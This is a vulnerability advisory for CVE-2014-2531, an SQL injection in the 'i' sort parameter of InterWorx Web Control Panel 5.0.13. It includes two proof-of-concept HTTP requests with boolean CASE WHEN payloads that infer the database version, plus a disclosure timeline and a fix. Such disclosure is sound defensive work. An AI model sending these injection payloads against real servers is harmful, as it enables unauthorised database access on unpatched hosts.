@@ -1,0 +1,72 @@
+=================================================
+Title: SQL injection in InterWorx Control Panel
+Product: InterWorx Web Control Panel
+Vendor: InterWorx LLC
+Tested Version: 5.0.13 build 574
+Vulnerability Type: SQL Injection [CWE-89]
+CVE Reference: CVE-2014-2531
+Solution Status: Fixed in Version 5.0.14 build 577
+Discovered and Provided: Eric Flokstra
+=================================================
+
+About the Vendor:
+-------------------------
+The InterWorx Hosting Control Panel is a web hosting and linux server
+management system that provides tools for server administrators to
+command their servers and for end users to oversee the operations of
+their website.
+
+Advisory Details:
+-----------------------
+SQL injection vulnerability in the InterWorx Web Control Panel.
+
+The InterWorx application stores its data in a MySQL-database. For
+interaction with the database dynamic queries are used. These queries
+are created by concatenating strings from the application with user
+input. However, the application does not perform proper validation or
+escaping of the supplied input in the 'i' parameter when sorting user
+accounts in NodeWorx, Siteworx and Resellers. Malicious users with
+access to this functionality can manipulate database queries to
+achieve other goals than the developers had in mind.
+
+The following requests can be used as proof of concept and demonstrate
+that user input is concatenated into a database query without proper
+validation or escaping. The payload in the first request checks
+whether the letter 'm' is the first letter of the database version.
+Since the database in use is MySQL this condition is true and the
+table is sorted by column 'nu.email'. If the condition is false
+(request 2/letter t) the table is sorted by column 'nu.nickname'.
+
+Request 1:
+---------------
+POST /xhr.php HTTP/1.1
+Host: some.host.com:1234
+".."
+
+i={"r":"Controller","i":{"pgn8state":{"l":20,"o":0,"or":"(CASE+WHEN+(substring(@@version,1,1)='m')+THEN+nu.email+ELSE+nu.nickname+END)","d":"asc"},"refresh_on":[["addCommit",null],["editCommit",null],["deleteCommit",null],["activateCommit",null],["deactivateCommit",null]],"iw_refresh_action":"listUsers","iw_refresh_ctrl":"Ctrl_Nodeworx_Users","security_token":"-eNSV4z4pdYomP3pg8LrVSwRtHYE","c":"index","a":"livePayloadCommit","iw_sess_hint":"nodeworx","iw_payload_output":"html","where_was_i":"/nodeworx/users"}}
+
+Request 2:
+---------------
+POST /xhr.php HTTP/1.1
+Host: some.host.com:1234
+".."
+
+i={"r":"Controller","i":{"pgn8state":{"l":20,"o":0,"or":"(CASE+WHEN+(substring(@@version,1,1)='t')+THEN+nu.email+ELSE+nu.nickname+END)","d":"asc"},"refresh_on":[["addCommit",null],["editCommit",null],["deleteCommit",null],["activateCommit",null],["deactivateCommit",null]],"iw_refresh_action":"listUsers","iw_refresh_ctrl":"Ctrl_Nodeworx_Users","security_token":"-eNSV4z4pdYomP3pg8LrVSwRtHYE","c":"index","a":"livePayloadCommit","iw_sess_hint":"nodeworx","iw_payload_output":"html","where_was_i":"/nodeworx/users"}}
+
+Vendor contact timeline:
+---------------------------------
+21 Feb 2014: Vendor notification
+21 Feb 2014: Vulnerability confirmation
+17 Mar 2014: Issue patched
+25 Mar 2014: Public disclosure
+
+Solution:
+------------
+Upgrade to the latest version (5.0.14 build 577) of InterWorx Web Control Panel.
+
+References:
+-----------------
+[1] InterWorx Beta Channel -
+http://forums.interworx.com/threads/8000-InterWorx-Version-5-0-14-Released-on-Beta-Channel!
+[2] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org
+[3] Common Weakness Enumeration (CWE) - http://cwe.mitre.org
